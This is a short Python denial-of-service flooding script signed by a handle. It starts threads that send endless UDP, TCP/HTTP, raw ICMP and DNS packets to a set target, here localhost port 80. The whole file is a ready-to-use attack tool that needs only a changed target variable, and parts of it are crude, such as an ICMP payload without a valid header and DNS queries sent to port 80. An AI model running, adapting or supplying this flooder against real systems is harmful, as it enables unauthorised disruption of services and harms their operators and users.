#by S3ns1l1ss
import socket
import threading
import struct 

target_host = "localhost" #local
target_port = 80
 
def send_udp():
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        message = b"UDP packet"
        client.sendto(message, (target_host, target_port))
        print("[*] UDP packet sent")

def send_tcp():
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_host, target_port))
        message = b"GET / HTTP/1.1\r\nHost: "+target_host.encode()+b"\r\n\r\n"
        client.send(message)
        print("[*] TCP packet sent")

def send_icmp():
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        message = b"ICMP packet"
        client.sendto(message, (target_host, target_port))
        print("[*] ICMP packet sent")

def send_dns():
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        message = struct.pack(">H H H H H", 1, 0, 1, 0, 0) + b"\x03www\x0bdns-team\x05blogu\x02tc\x00\x00\x01\x00\x01"
        client.sendto(message, (target_host, target_port))
        print("[*] DNS query sent")



def run_requests(num_threads):
    

    for i in range(num_threads):
        udp_thread = threading.Thread(target=send_udp)
        tcp_thread = threading.Thread(target=send_tcp)
        icmp_thread = threading.Thread(target=send_icmp)
        dns_thread = threading.Thread(target=send_dns)


        udp_thread.start()
        tcp_thread.start()
        icmp_thread.start()
        dns_thread.start()

run_requests(1)
